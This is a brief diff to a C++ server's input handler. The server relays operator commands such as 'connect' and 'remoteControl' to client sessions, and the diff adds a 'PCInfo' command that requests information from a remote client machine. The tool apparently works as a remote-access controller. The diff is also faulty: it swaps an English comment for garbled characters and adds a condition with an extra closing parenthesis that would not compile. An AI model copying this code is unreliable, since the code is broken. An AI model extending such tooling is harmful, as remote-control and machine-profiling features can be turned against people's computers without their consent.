@@ -52,7 +52,7 @@ void Server::HandleInput()
 	{
 		std::getline(std::cin, userinput);
 
-		if (currentSessionID == -1)			//handle command while not having selected a client
+		if (currentSessionID == -1)			//ƒRƒ}ƒ“ƒh
 		{
 			if (General::processParameter(userinput, "connect"))
 			{
@@ -110,6 +110,11 @@ void Server::HandleInput()
 				}
 				inputInt = 0;
 				userinput.empty();
+			}
+
+			else if (userinput == "PCInfo"))
+			{
+				SendString(currentSessionID, userinput, PacketType::Instruction);
 			}
 
 			else if (userinput.find("remoteControl") != std::string::npos)
